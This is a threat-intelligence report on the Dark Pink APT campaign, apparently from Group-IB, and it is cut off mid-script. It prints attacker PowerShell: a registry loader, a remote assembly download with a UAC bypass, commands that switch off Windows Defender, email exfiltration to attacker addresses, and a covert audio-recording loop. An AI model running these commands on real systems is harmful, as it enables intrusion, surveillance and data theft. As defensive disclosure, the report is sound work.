    "plain_text": "# Dark Pink APT unleashes malware for deeper and more sinister intrusions in the Asia-Pacific and Europe\n\n**group-ib.com/blog/dark-pink-apt**\n\n### Acknowledgements\n\nWe would like to specifically thank Albert Priego, Malware Analyst at Group-IB, for\n**discovering the first Dark Pink attacks and for conducting the initial research into this**\nparticular threat actor. His efforts made a major contribution to this blog and for our future\nresearch into this APT group.\n\n## Introduction\n\n[Countries of the Asia-Pacific region have long been the target of advanced persistent](https://www.group-ib.com/resources/knowledge-hub/apt/)\n[threat (APT) groups. Earlier Group-IB research found that this region has often been a](https://www.group-ib.com/resources/knowledge-hub/apt/)\n“key arena” of APT activity, and a mixture of nation-state threat actors from China, North\nKorea, Iran, and Pakistan have been tied to a wave of attacks in the region. More often\nthan not, the primary motive for APT attacks in the Asia-Pacific (APAC) region is not\nfinancial gain, but rather espionage.\n\n**Group-IB continuously explores and analyzes the methods, tools, and tactics used**\n**[by some of the world’s most prominent APT groups, such as APT41, but how can](https://www.group-ib.com/blog/apt41-world-tour-2021/)**\nlarge-scale companies and organizations protect themselves when a new APT group\nemerges, or, if an already existing APT group begins to utilize a completely new toolkit.\nEnter Dark Pink.\n\n**Dark Pink is the name given by Group-IB to a new wave of APT attacks that has**\n**struck the APAC region. At the present time, Group-IB cannot attribute the campaign to**\nany known threat actor, making it highly likely that Dark Pink is an entirely new APT\n**group. Bearing this in mind, we will refer to Dark Pink as an APT group throughout the**\nentirety of this text. The name Dark Pink was coined by forming a hybrid of some of the\nemail addresses used by the threat actors during data exfiltration. The APT group has\n[also been termed Saaiwc Group by Chinese cybersecurity researchers.](https://mp.weixin.qq.com/s/G3gUjg9WC96NW4cRPww6gw)\n\nThere is evidence to suggest that Dark Pink began operations as early as mid-2021,\n[although the group’s activity surged in mid-to-late 2022. To date, Group-IB’s sector-](https://www.group-ib.com/products/threat-intelligence/)\n**[leading Threat Intelligence](https://www.group-ib.com/products/threat-intelligence/)** **uncovered seven confirmed attacks by Dark Pink. The**\nbulk of the attacks were carried out against countries in the APAC region, although the\nthreat actors spread their wings and targeted one European governmental ministry. The\nconfirmed victims include two military bodies in the Philippines and Malaysia,\n**government agencies in Cambodia, Indonesia and Bosnia and Herzegovina, and a**\n**religious organization in Vietnam. Group-IB also became aware of an unsuccessful**\nattack on a European state development agency based in Vietnam. In line with Group\n\n-----\n\nIB’s zero tolerance policy to cybercrime, confirmed and potential victims of Dark Pink\n**were issued proactive notifications, and we note that the list of companies breached**\nby this particular APT group is likely to be longer.\n\nGroup-IB’s early research into Dark Pink has revealed that these threat actors are\nleveraging a new set of tactics, techniques, and procedures rarely utilized by previously\nknown APT groups. They leverage a custom toolkit, featuring TelePowerBot,\n_KamiKakaBot, and Cucky and Ctealer information stealers (all names dubbed by Group-_\nIB) with the aim of stealing confidential documentation held on the networks of\ngovernment and military organizations. Of particular note is Dark Pink’s ability to infect\n**even the USB devices attached to compromised computers, and also its ability to**\n**gain access to messengers on infected machines. Furthermore, Dark Pink threat**\n[actors utilize two core techniques: DLL Side-Loading and executing malicious content](https://attack.mitre.org/techniques/T1574/002/)\n**[triggered by a file type association (Event Triggered Execution: Change Default File](https://attack.mitre.org/techniques/T1546/001/)**\n[Association). The latter of these tactics is one rarely seen utilized in the wild by threat](https://attack.mitre.org/techniques/T1546/001/)\nactors.\n\nAt the time of writing, Dark Pink is still active. Given the fact that many of the attacks\n**identified by Group-IB researchers took place in the final months of 2022, Group-IB**\nresearchers are still in the process of identifying the full scope of the APT attack, and\nefforts to uncover the origin of this APT group are in process. However, we believe that\nthis preliminary research, which will be of great interest to CISO, heads of cybersecurity\n[teams, SOC analysts and incident response specialists, will go a long way to raising](https://www.group-ib.com/resources/knowledge-hub/security-operations-center/)\nawareness of the new TTPs utilized by this threat actor and help organizations to take\n**the relevant steps to protect themselves from a potentially devastating APT attack.**\n\n## Key findings\n\n**Dark Pink launched seven successful attacks against high-profile targets**\nbetween June and December 2022.\nDark Pink’s first activity, which we tie to a Github account leveraged by the threat\nactors, was recorded in mid-2021, and the first attack attributable to this APT\n**group took place in June 2022. Their activity peaked in the final three months of**\n2022 when they launched four confirmed attacks.\nDark Pink’s victims are located in five APAC countries (Vietnam, Malaysia,\nIndonesia, Cambodia, Philippines) and one European country (Bosnia and\nHerzegovina).\nVictims included military bodies, government and development agencies, religious\norganizations, and a non-profit organization.\nOne unsuccessful attack was launched against a European state development\nagency based in Vietnam in October 2022.\n**Dark Pink APT’s primary goals are to conduct corporate espionage, steal**\ndocuments, capture the sound from the microphones of infected devices, and\nexfiltrate data from messengers.\n\n\n-----\n\n**Dark Pink’s core initial vector was targeted spear-phishing emails that saw the**\nthreat actors pose as job applicants. There was evidence to suggest that the threat\nactors behind Dark Pink scanned online job vacancy portals and crafted unique\nemails to victims that were advertising vacancies.\nAlmost all the tools leveraged by the threat actors were custom and self-made,\nincluding TelePowerBot and KamiKakaBot, along with the Cucky and Ctealer\nstealers. During our investigation, we noticed only one public tool: PowerSploit/Get_MicrophoneAudio._\n**Dark Pink APT utilized a rarely seen technique, termed Event Triggered**\n**Execution: Change Default File Association, to ensure launch of malicious**\nTelePowerBot malware. Another technique leveraged by these particular threat\nactors was DLL Side-Loading, which they used to avoid detection during initial\naccess.\n**The threat actors created a set of PowerShell scripts to carry out**\ncommunication between victim and threat actors’ infrastructure, facilitate lateral\nmovement and network reconnaissance.\nAll communication between infected infrastructure and the threat actors behind Dark\nPink is based on Telegram API.\n\n## Dark Pink takes on all comers\n\nThe attacks carried out by this particular APT group have been advanced in every sense\nof the word. They have utilized a sophisticated mixture of custom tools to breach the\ndefenses of multiple government and military organizations. The first attack Group-IB\n**analysts were able to attribute to this APT group was registered on a religious**\n**organization in Vietnam in June 2022. However, they appear to have been active well**\nbefore that, as Group-IB researchers identified a Github account used by these threat\nactors which showed activity dating back to mid-2021. According to our research, the\nmalware initialized by the threat actors can issue commands for an infected machine to\ndownload modules from this particular Github account. Interestingly, the threat actors\n**appeared to use only one Github account for the entire duration of the campaign to**\ndate, which could suggest that they have been able to operate without detection for a\nsignificant period of time.\n\nFigure 1: Screenshot detailing activity on Github account attributed to Dark Pink APT in 2021 (above)\n\nand 2022 (below)\n\nFollowing the June 2022 attack, Group-IB researchers were unable to attribute any other\nmalicious activity to Dark Pink. However, this APT group burst into life towards the end of\nthe summer, when Group-IB noticed an attack on a Vietnamese non-profit\n**organization in August 2022 bearing all the hallmarks of the June attack. From then,**\nGroup-IB was able to attribute one attack in September, two attacks (one successful, one\nunsuccessful) in October, two in November, and one in December. Most recently, GroupIB discovered that Dark Pink was able to breach an Indonesian governmental\n**organization on December 8 2022**\n\n\n-----\n\nFigure 2: Dark Pink APT timeline and targets\n\n## Kill Chain\n\nThe sophistication of the Dark Pink campaign is evidenced by its multiple distinct kill\nchains. The threat actors behind this wave of attacks were able to craft their tools in\n**several programming languages, giving them flexibility as they attempted to breach**\ndefense infrastructure and gain persistence on victims’ networks. As a result, we will\ndiscuss the different steps and stages of these processes, but it is important to note that\nthe bulk of the attacks were based on PowerShell scripts or commands that aimed to\nlaunch communication between the infected networks and the threat actors’\ninfrastructure.\n\nInitial access was achieved by successful spear-phishing emails. These messages\ncontained a shortened link directing the victim to download a malicious ISO image, which\nin one case seen by Group-IB, was stored on the public, free-to-use sharing service\n_MediaFire. Once the ISO image was downloaded by the victims, Group-IB identified three_\ndistinct infection chains, which we will detail below.\n\nThe first thing that caught our attention was that all communication between the devices\nof the threat actors and the victims was based on Telegram API. The custom modules\ncreated by the threat actors, TelePowerBot and KamiKakaBot, are designed to read and\nexecute commands via a threat actor-controlled Telegram bot. Interestingly, these\nmodules were developed in different programming languages. TelePowerBot is\nrepresented as PowerShell script, while KamiKakaBot, which includes stealer\nfunctionalities, is developed on .NET. The threat actors have used the same Telegram\nbots for a long period of time, as one has been used since September 2021.\n\nAdditionally, Dark Pink APT utilizes the self-made stealers Ctealer and Cucky to steal\n**victim credentials from web browsers. We will look at each of the above mentioned**\ntools later in this report. At this stage, we will turn to detailing each step of the infection\nchain.\n\n### Initial access\n\nA large part of the success of Dark Pink was down to the spear-phishing emails used to\ngain initial access. In one such attack, Group-IB was able to find the original email sent by\nthe threat actors. In this one instance, the threat actor posed as a job applicant applying\nfor the position of PR and Communications intern. In the email, the threat actor mentions\nthat they found the vacancy on a jobseeker site, which could suggest that the threat\n**actors scan job boards and use this information to create highly relevant phishing**\n**emails.**\n\n\n-----\n\nThe emails contain a shortened URL linking to a free-to-use file sharing site, where the\n**victim is presented with the option to download an ISO image that contains all the**\nfiles needed for the threat actors to infect the victim’s network. During our investigation\ninto Dark Pink, we discovered that the threat actors leveraged several different ISO\nimages, and we also noted that the documents contained in these ISO images varied\nfrom case to case. According to the information available to us, we strongly believe that\n**the Dark Pink threat actors craft a unique email to each victim, and we do not**\ndiscount that the threat actors can send the malicious ISO image as a direct attachment\nto the victim via email.\n\nFigure 3: Screenshot of original spear-phishing email sent by Dark Pink APT noting the storage of the\n\nISO image on a file-sharing site.\n\nThe ISO images sent in the spear-phishing emails contained varying numbers of files.\nHowever, there are three types of file found in all of the ISO images sent by the\n**threat actors: a signed executable file, a nonmalicious decoy document (e.g. .doc,**\n.pdf, or .jpg), and a malicious DLL file. Given that the email relates to a job opening, one\ncan assume that the victim will first look for the supposed applicant’s resume, which is\noften sent as a MS Word document. However, In Dark Pink attacks, the threat actors\ninclude an .exe file in the ISO image that mimics a MS Word file. The file contains “.doc”\nin the file name and contains the MS Word icon as a means of confusing the victim and\nthinking that the file is safe to open.\n\nFigure 4: Screenshot detailing the five files contained in one ISO image seen by Group-IB. Note that\n\nthe .doc and .dll files are in hidden view.\n\nShould the victim execute the .exe file first, the malicious DLL file, located in the same\nfolder as the .exe file, will run automatically. This is a technique used by threat actors\n[known as DLL Side-Loading. The primary function of the DLL execution is to ensure that](https://attack.mitre.org/techniques/T1574/002/)\nthe threat actors’ core malware, TelePowerBot, gains persistence. Before the completion\nof the file execution, the decoy document (e.g. a letter, resume), is shown on the victim’s\nscreen.\n\n### Trojan execution and persistence\n\nOne of the most interesting discoveries for Group-IB researchers was the process of how\n_TelePowerBot or KamiKakaBot are launched on the victim’s machine. As mentioned_\npreviously, the malicious DLL file that contains one of these two pieces of malware can be\nlocated inside the ISO image that is sent during spear-phishing campaigns. In one case\nanalyzed by Group-IB, the threat actors used a chain of MS Office documents and\n**[leveraged Template Injection, whereby the threat actors insert into the initial document](https://attack.mitre.org/techniques/T1221/)**\na link to a template document that contains a malicious macro code. In two other cases\nexamined by Group-IB researchers, the threat actors behind Dark Pink launched their\n**malware by the DLL Side-Loading technique. In total, we found three different kill**\nchains leveraged by the threat actors, and we will detail them below.\n\n\n-----\n\n### Kill Chain 1: All-inclusive ISO\n\nThe first variant of the infection chain results in an ISO image being sent to the victim\nthrough spear-phishing emails. This ISO image includes a malicious DLL file, which\ncontains TelePowerDropper (name given by Group-IB). The primary goal of this DLL file is\nto gain persistence for TelePowerBot in the registry of the infected machine. In some\ncases, the DLL file can also launch the threat actors’ proprietary stealer Stealer, which\nparses data from browsers on the victim’s machine and stores it in a local folder. It is\nimportant to note that launching any kind of stealer is optional during initial access. Dark\n**Pink can send special commands to download and launch a stealer during all**\n**phases of attack.**\n\nFigure 5: Graphic detailing the full scheme of Kill Chain 1\n\nIt is important to note at this stage that the DLL files are packed. When the file is\nlaunched, it decrypts itself and passes control to an unpacked version of itself.\nAdditionally, once the DLL file is launched, a mutex will be created. One example of this\nwas: gwgXSznM-Jz92k33A-uRcCCksA-9XAU93r5. Upon completion of this step, a\ncommand to start TelePowerBot will be added to autorun. This means that TelePowerBot\nwill be launched each time the user logs into their system. This is facilitated by creating a\nregistry key by path HKCU\\Environment\\UserInitMprLogonScript. The value of the\ncreated key is as follows:\n```\nforfiles.exe /p %system32% /m notepad.exe /c \"cmd.exe /c whoami >>\n%appdata%\\a.abcd && %appdata%\\a.abcd && exit\"\n\n```\nThe above code reveals that the command launches a standard utility, whoami, which\nshows information about the current user of the machine. The output is redirected to a file\nand execution is finished.\n\nAt this point it might not be entirely clear how the next stage, and the launching of\nTelePowerBot, begins. The key to this answer is the file extension .abcd. In short, the\n[threat actors create a file with this extension name as part of a technique termed Event](https://attack.mitre.org/techniques/T1546/001/)\n[Triggered Execution: Change Default File Association. The idea is to add a handler to](https://attack.mitre.org/techniques/T1546/001/)\nwork with the unrecognized file extension in the registry key tree. This is detailed in the\nbelow screenshot.\n\nFigure 6: Screenshot detailing command to run upon creation of file with extension .abcd\n\nThe above screenshot details part of a PowerShell command that is triggered when a file\nis created with the specific extension .abcd. The PowerShell commands are stored in\nbase64 view and are highly obfuscated. The result of these commands are relatively\nsimple: read registry key, decrypt, and launch TelePowerBot.\n\n\n-----\n\n### Kill Chain 2: Github macros\n\nThe second variation of the infection chain is almost identical to the preceding one. The\nonly thing that differs is the file used in the initial stage. During our analysis, we\ndiscovered that the threat actors used commands to automatically download a\n**malicious template document containing TelePowerBot from Github upon opening of**\nthe .doc contained in the initial ISO file. Macro code written into this template document\nthen works to ensure persistence for the malware.\n\nFigure 7: Graphic detailing the full scheme of Kill Chain 2\n\nIn this instance, the ISO image sent to the victims contains a MS Word document that\nleads to the automatic download of a malicious template document, which contains\nTelePowerBot, from Github. In order to evade antivirus defenses on an infected machine\nduring initial access, macro code is written into the template document. This technique is\n[known as Template Injection. The macro contains several forms with fields, and during](https://attack.mitre.org/techniques/T1221/)\nexecution, the value of these form fields are read and established as a value in registry\nkeys.\n\nThis trick can help the malware avoid detection by antivirus software, as the document\nitself does not contain any malicious functionalities or code. The coded documents\ncontain forms with several parameters, and the macros contained in these files can read\nthese values and work to ensure persistence of TelePowerBot on the victim’s machine.\n\nFigure 8: Screenshot detailing two forms contained predefined keys and values that are written to the\n\nregistry by the malicious macro code written into the MS Word file sent to victims\n\n### Kill Chain 3: X(ML) marks the spot\n\nThe third and final kill chain variant that we will detail is one that was used in the most\n**recent Dark Pink attack analyzed by Group-IB, which saw the threat actors breach the**\n**network of an Indonesian government agency on December 8, 2022. The ISO image**\nsent to the victim in a spear-phishing email contained decoy documents, a signed\nlegitimate MS Word file, and a malicious DLL named KamiKakaDropper. The primary goal\nof this infection vector is to persist KamiKakaBot on infected machines. In this kill chain,\nan XML file is located at the end of the decoy document in encrypted view. The malicious\nDLL file is, as in Kill Chain 1, launched by the DLL Side-Loading technique. Once the DLL\nfile is launched, the XML file that kicks off the next stage of the kill chain will be decrypted\nfrom the decoy document and saved in the infected machine.\n\nFigure 9: Graphic detailing the full scheme of Kill Chain 3\n\nThe XML file contains an MSBuild project that includes a task to execute .NET code. To\n[find more about how this process works, please refer to the following Microsoft](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-tasks?view=vs-2022)\n[documentation. The logic of the .NET code is simple: launch KamiKakaBot, which itself is](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-tasks?view=vs-2022)\n\n\n-----\n\nlocated in the XML file (packed and encoded in base64 format). After this file is unpacked,\ncontrol is passed to KamiKakaBot.\n\nFigure 10: Snippet of code inside XML file that unpacks and launches KakaKamiBot\n\nThe path to the XML file is passed as an argument upon the launch of MSBuild. The\ncommand to run MSBuild is located in the registry key\n(HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell), which is\ncreated during execution of the DLL file. Once this step is completed, MSBuild will run\neach time a user logs on to the system. In addition, the DLL creates a repeatable task to\nlog the victim off from the system.\n\n## Reconnaissance and lateral movement\n\nAfter infecting a computer in the victim organization’s network, the next goal for Dark\n**Pink is to collect as much information as possible about the victim’s network**\n**infrastructure. From our analysis, we see that the threat actors are interested in the**\nfollowing:\n\ninformation from standard utility, e.g output of standard utility systeminfo.\ninformation from web browsers.\ninstalled software, including antivirus solutions.\ninformation about connected USB devices and network sharing.\n\n**The threat actors also collect a list of network and USB drives that are available for**\nwriting, and these are then used for lateral movement. Next, instead of the original file,\nthe attack sees the creation of a LNK file (Windows shortcut) with a command to launch\nTelePowerDropper. At this stage, the original files are hidden from the user.\n\nOne of the most interesting revelations of our investigation into Dark Pink was how the\n**threat actors carry out lateral movement over USB devices. For this, a new WMI**\nevent handler is registered. From this point onwards, each time a USB flash drive is\nplugged into an infected machine, a specific action will be executed that sees\nTeleBotDropper downloaded and stored on the flash drive. Let’s analyze this process a\nlittle deeper.\n\n1. Victim plugs USB flash drive into infected device\n2. The WMI event is triggered, and results in the automatic download of a .ZIP archive\n\nfrom the threat actors’ Github account. There are three files inside this archive:\n_Dism.exe, Dism.sys, and Dismcore.dll. The first of these files is a legitimate file with_\na valid digital signature. The functionality of the DLL file is to unpack the original\nexecutable from file Dism.sys.\n3. Archive is extracted to %tmp% folder. The files are then copied to the USB device,\n\nwhere a new folder named “dism” is created. The folder attribution is changed to\nhidden and system.\n4 A file named system bat is created containing a command to launch Dism exe\n\n\n-----\n\n5. Finally, as many LNK files are created as there are folders on the USB drive. The\n\nattributes of the original folder are changed to hidden and system. A LNK file is\ncreated with a command to open the hidden folder in explorer.exe and launch\nsystem.bat.\n\nFollowing this process, the user will see LNK files bearing the same name as folders\nfound on the USB device. Once the user opens this malicious LNK file, TeleBotDropper\nwill be launched by the DLL Side-Loading technique (the functionalities of TeleBotDropper\nhave been already shown in the previous section). As a result, the commands, which read\nregistry key, decrypt, and launch TelePowerBot, are then transferred to a new machine. It\nis imperative to remember that this solution works if there is only one folder on the USB\ndevice. This is why we observed different implementations, for example, the creation of\nLNK files instead of .pdf files (not only for folders) on USB devices. An example of how\nthis works in more detail is provided in APPENDIX B. The mechanism of creating LNK\nfiles in place of the original files is also used for network sharing.\n\n## Data exfiltration\n\nAs is the case with many other attacks of this kind, the threat actors exfiltrate data\nthrough ZIP archives. During Dark Pink attacks, all data (list of files from common\nnetwork shares, web browser data, documents, etc.) that is to be sent to the threat actors\nis stacked in the $env:tmp\\backuplog folder. However, the collection and sending process\noperate separately from one another. When the infected machine is issued a command to\ndownload the $env:tmp\\backuplog folder, the list of files will be copied to\n_$env:tmp\\backuplog1 folder, added to archive and sent to the threat actors’ Telegram bot._\nAfter this step is completed, the $env:tmp\\backuplog1 directory is deleted.\n\n**Dark Pink threat actors can also leverage their self-made stealers Cucky and**\n**_Ctealer to draw data from infected machines. The functionalities of both of these_**\nstealers are the same. They can be used to extract data such as passwords, history,\nlogins, and cookies from web browsers. The stealers themselves do not require any\ninternet connection, as they save the result of the execution (stolen data) to files. Both of\nthe stealers can be downloaded from the threat actors’ Github account automatically by\ncommands issued by the malware. An example of the script used to launch Cucky is\nshown in APPENDIX C.\n\nIn total, Group-IB researchers discovered that Dark Pink exfiltrated files via three\n**separate pathways. The first of these pathways sees the threat actors use Telegram to**\nreceive files. As a device is infected, information is collected in a specific folder by the\nmalware and sent via Telegram by a special command. By extension, the files that are\nsent to the threat actors are: .doc, .docx, xls,.xlsx,.ppt,.pptx,.pdf. An example of a script\nthat carries out this process can be found in APPENDIX D.\n\n\n-----\n\nIn addition to Telegram, Group-IB found evidence that the threat actors exfiltrated\n**files via Dropbox. This method is slightly different to the one used to exfiltrate via**\nTelegram, as it involves a series of PowerShell scripts that transfer files from a specific\nfolder to a Dropbox account by performing a HTTP request with a hardcoded token.\n\nOne particular attack discovered by Group-IB was of particular surprise to us. Despite the\ndevice being controlled by commands issued by a threat actor-controlled Telegram\nchannel via Telegram bots, some interesting files were sent via email. An example of this\ncommand is shown below.\n```\n$filepath=\"$env:tmp/backuplog\";\n$cred = New-Object System.Management.Automation.PSCredential\n(\"lanhuong.jsc@outlook.com\",(ConvertTo-SecureString \"CHANGED\" -AsPlainText Force));\nSend-MailMessage -To \"blackpink.301@outlook[.]com\" -From\n\"blackred.113@outlook[.]com\"\n  -Body \"hello badboy\" -SmtpServer \"smtp-mail.outlook.com\" -Port 587\n  -Subject \"$env:computername\" -UseSsl -Credential $cred\n  -Attachments (gci $filepath).fullname\n\n```\nThe list of emails used during data exfiltration are shown below:\n\n_blackpink.301@outlook[.]com_\n_alibaba.113@outlook[.]com_\n_alibaba.113@outlook[.]com.vn_\n_blackred.113@outlook[.]com_\n_lanhuong.jsc@outlook[.]com_\n_nphuongmai.97@outlook[.]com_\n\nAt this stage, Group-IB researchers believe that the exfiltration method of choice depends\non the potential restrictions set out in the victim’s network infrastructure.\n\n## Evasion techniques\n\nDuring their attacks, the threat actors used an already known technique to bypass User\nAccount Control (UAC) to alter the settings in Windows Defender. They did this by\n[elevating the COM interface. The methods used are not unique and different](https://attack.mitre.org/techniques/T1548/002)\nimplementations were found in different programming languages.\n\nFigure 11: Screenshot of decompiled executable that allows UAC to be bypassed\n\nThe settings are changed by a special PowerShell script which is received as a\ncommand, and implemented in .NET application. This command comes in the form of an\nexecutable file (in base64 view) that is automatically downloaded from Github upon\ninfection. The executable does not gain persistence nor is it saved on an infected system.\nThe executable does not persist and is not saved into an infected system. An example of\ndownloading and launching are shown below.\n\n\n-----\n\n```\n[Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object\nSystem.Net.WebClient).DownloadString(URL)));\n[NETLUA.Main]::BypassUAC(\"powershell\\\", \\\"-c {$command}\")\n\n```\nThe PowerShell command to modify Windows Defender Settings is passed as an\nargument and is shown as follows:\n```\nSet-MpPreference -DisableArchiveScanning $true -ea 0;\nSet-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0;\nSet-MpPreference -DisableCatchupFullScan $true -Force -ea 0;\nSet-MpPreference -DisableCatchupQuickScan $true -Force -ea 0;\nSet-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0;\nSet-MpPreference -DisableIOAVProtection $true -Force -ea 0;\nSet-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0;\nSet-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0;\nSet-MpPreference -DisableRestorePoint $true -Force -ea 0;\nSet-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea\n0;\nSet-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0;\nSet-MpPreference -DisableScriptScanning $true -Force -ea 0;\nSet-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0;\nSet-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0;\nSet-MpPreference -MAPSReporting Disabled -Force -ea 0;\nSet-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0;\nSet-MpPreference -PUAProtection Disabled -Force -ea 0\n\n```\nThe PowerShell commands will be executed using the .NET application as a tool for\nprivilege escalation.\n\n## Tools\n\n### Cucky\n\nCucky is a simple custom stealer developed on .NET. A variety of samples were found\nduring the investigation. The most analyzed versions were packed by Confuser. It does\nnot communicate with the network, and collected information is saved in the folder\n_%TEMP%\\backuplog. Cucky is able to draw data such as passwords, history, logins,_\n**and cookies from targeted web browsers. Although we do not have any information**\nrelated to the use of stolen data, we suppose that it can be used to gain access to email\nweb clients, conduct additional infrastructure reconnaissance based on web history,\ncompile a list of organization employees, distribute malicious attachments, and assess\nwhether the compromised machine is real or virtual.\n\n**Cucky has the functionality to steal data from the following browsers:**\n\nChrome, MS Edge, CocCoc, Chromium, Brave, Atom, Uran, Sputnik, Slimjet, Epic\nPrivacy, Amigo, Vivaldy, Kometa, Comodo, Nichrome, Maxthon, Comodo Dragon, Avast\nBrowser, Yandex Browser.\n\nFigure 12: Screenshot of decompiled Cucky stealer\n\n\n-----\n\nThe sample found contained the path below to debug information:\nC:\\Users\\hoang\\source\\repos\\Cucky\\Cucky\\obj\\Release\\net46\\Cucky.pdb\n\n### Ctealer\n\nCtealer is an analog of Cucky but developed on C/C++. TelePowerDropper or a special\ncommand issued by the threat actors can be used to deploy Ctealer. The working process\nis pretty similar to Cucky as well, as it also saves collected files to the\n_%TEMP%\\backuplog folder. Ctealer can draw information from the following web_\n**browsers:**\n\nChrome, Chromium, MS Edge, Brave, Epic Privacy, Amigo, Vivaldi, Orbitum, Atom,\nKometa, Dragon, Torch, Comodo, Slimjet, 360 Browser, Maxthon, K-Melon, Sputnik,\nNichrome, CocCoc, Uran, Chromodo, Yandex Browser.\n\nThe sample found contained the path below to debug information:\n\nC:\\Users\\build\\source\\repos\\CtealWebCredential\\Release\\CtealWebCredential.pdb\n\n### TelePowerBot\n\nAs we have already noted, TelePowerBot will be launched every time a user of an\n**infected machine logs into the system. When this happens, a special script will be**\nlaunched. The script reads the value of another regkey (e.g\n_HKCU\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd), which begins decryption and launch of_\nTelePowerBot. The encryption is based on xor where the key is an array number from 0\nto 256. Before decryption, the original payload will be decoded from base64. The\ndeobfuscated command example is shown below:\n```\niex(\n [System.Text.Encoding]::UTF8.GetString(\n          ([System.Convert]::FromBase64String(\n              (gp \"HKCU:\\\\SOFTWARE\\\\Classes\\\\abcdfile\\\\shell\" -Name\n\"abcd\").\"abcd\") | % -Begin{$i=0} -Process{\n                   $_ = $_ -bxor $i%256;$i++;$_\n              }\n          )\n     )\n) | iex\n\n```\nThe decrypted stage is not final. It is an intermediate stage and also is based on\nPowerShell and is highly obfuscated. At this stage, the final script has already been\nstored in the stager but it is separated into blocks. From this, a base64 string is created,\nand after decoding, we will be left with a ZIP stream. Finally, after all this, TelePowerBot is\nlaunched after unzipping.\n\n\n-----\n\nThis kind of tool communicates with a Telegram channel to receive new tasks from the\nthreat actors. The bot can communicate with various infected devices, and the bot\n**checks for new commands every 60 seconds. During execution, the bot works with**\ntwo register keys: HKCU\\Environment\\Update and HKCU\\Environment\\guid. The first one\nstores the last message id, which is processed from the Telegram bot (The parameter\n_update_id from Telegram). The second key stores the unique identification of infected_\nmachines. It is generated by command [guid]::NewGuid() when the bot launches for the\nfirst time. Upon registration, the threat actors get various pieces of information about the\ninfected machine such as ip, guid, computer name. The IP address is also ascertained via\n[a get request to https://ifconfig.me/ip. These processes are also based on PowerShell](https://ifconfig.me/ip)\ncommands, and we will dig a little deeper into those later in the report. The bot\nimplementation is shown in APPENDIX A.\n\nSome variants of this module contain additional functionality for ensuring lateral\nmovement. All other functionalities are the same. In cases that Group-IB analyzed, the\nTelegram parameter can either be hardcoded in the scripts or read from the registry key.\n\n### KamiKakaBot\n\nKamiKakaBot is the .NET version of TelePowerBot, and we found very few differences\nbetween the pair of them. Before commands are read, KamiKakaBot is able to exfiltrate\nfrom the Chrome, MS Edge, and Firefox browsers. It is able to update itself and once it\nreceives commands, it can pass an argument to the cmd.exe process.\n\nFigure 13: Screenshot detailing decompiled executable that contains KamiKakaBot\n\n### PowerSploit/Get-MicrophoneAudio\n\nAs we have noted above, the threat actors behind Dark Pink almost exclusively\n**leveraged custom made tools. However, to record the microphone audio from infected**\ndevices, they turned to a publicly available PowerSploit module – Get-MicrophoneAudio.\nThis is loaded onto the victim’s machine via download from Github. Group-IB\n**researchers found that antivirus software on victim machines blocked this process**\n**when the threat actors attempted to launch the module. We found that the threat**\nactors attempted to obfuscate the original PowerSploit module to make it undetectable,\nand these were unsuccessful. As a result, the threat actors returned to the drawing board\nand added a script (below) that was successfully able to record the microphone audio on\ninfected devices.\n\n\n-----\n\n```\nStart-Job {\n while(1){\n     ps psr -erroraction 'silentlycontinue' | kill -force;sleep 30;\n     ni \"$($env:tmp)\\\\record\" -ItemType Directory -erroraction\n'silentlycontinue';\n     start psr -ArgumentList \"/start /output $($env:tmp)\\\\record\\\\$((getdate).tostring('yyyyMMddHHmmss')).zip /sc 1 /gui 0\";\n     sleep 60;\n     start psr -ArgumentList \"/stop\"\n }\n}\n\n```\nThis simple script launches a background task that triggers a standard utility PSR to\ncapture sound every minute. The recorded audio files will be saved inside a ZIP archive\nthat is located in a temporary folder (%TEMP%\\record). The files are named according to\nthe following template: ‘yyyyMMddHHmmss’. These audio files are then exfiltrated with a\nseparate script that sends them (as a ZIP archive), to the threat actors’ Telegram bot.\n\n### ZMsg (Messenger exfiltration)\n\n**The threat actors are also interested in stealing data from messengers on infected**\n**devices. To this end, they are able to execute commands to identify leading messengers,**\nsuch as Viber, Telegram, and Zalo. In the case of Viber, these commands allow the threat\nactors to exfiltrate the %APPDATA%\\Viberpc folder on infected devices, which allows\nthem to gain access to the messages and contact lists of the victims. We are still doing\nwork to assess what the threat actors are able to draw from Telegram accounts on\ninfected devices, but the case of Zalo is one that piqued our interest.\n\nIf Zalo messenger is present on the victim’s device, the threat actors can launch a\ncommand to download a special utility (dubbed ZMsg by Group-IB), from Github. This\nutility, which is a .NET application based on the FlaUI library, allows the threat actors to\nexfiltrate the victim’s messages on the Zalo platform. FlaUI is a library that assists with\nthe automatic UI testing of Windows applications, with the entry point usually an\napplication or the desktop to generate an automation element. Through this, it is possible\nto analyze sub-elements and interact with them.\n\nZMsg iterates elements on Windows applications to discover those with particular names.\nFor example, the element with messages has the name “messageView”. All collected\ninformation is stored in the %TEMP%\\KoVosRLvmU\\ folder in files with the .dat and .bin\nextensions. File names are created as an encoded hex string, and are generated in\naccordance with the below template:\n\n_%PERSON_NAME%_%DAY%_%MONTH%_%YEAR%_\n\n\n-----\n\n## Commands\n\n**The threat actors issue commands to an infected device by specifying ip, computer**\n**name, or botid. Tasks can also be issued to all infected devices simultaneously. During**\nour examination, we noticed several different kinds of commands. The functionalities of\nsome of these commands overlap, but they are based on PowerShell commands. For\nexample, TelePowerBot can execute a simple standard console tool, such as whoami, or\na complex PowerShell script.\n\nDuring infection, the threat actors execute several standard commands (e.g. net\nshare, Get-SmbShare) to determine what network resources are connected to the\ninfected device. If network disk usage is found, they will begin exploring this disk to find\nfiles that may be of interest to them and potentially exfiltrate them. In the prior section, we\nnoted how Dark Pink threat actors carry out lateral movement. In this campaign, the\nthreat actors can also infect files on USB disks attached to the infected devices. The\nscript below details how the threat actors compile a list of network shares and the\nremovable devices connected to the machine.\n```\n(gwmi cim_logicaldisk|?{($_.drivetype -eq 